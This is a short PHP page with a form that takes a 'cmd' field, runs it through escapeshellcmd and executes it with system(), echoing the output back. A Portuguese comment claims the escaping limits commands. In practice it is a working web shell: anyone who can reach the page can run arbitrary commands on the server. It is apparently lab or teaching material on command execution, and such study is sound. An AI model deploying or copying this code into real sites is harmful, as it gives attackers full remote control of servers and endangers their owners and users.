<?php

if ($_SERVER["REQUEST_METHOD"] === 'POST') {
    $cmd = escapeshellcmd($_POST["cmd"]); //Faz um escape de comandos além do que foi definido pelo sistema
    var_dump($cmd);
    echo "<pre>";
    $comando = system($cmd, $result);
    echo "</pre>";
}

?>

<form method="POST">
    <input type="text" name="cmd">
    <button type="submit">Enviar</button>

</form>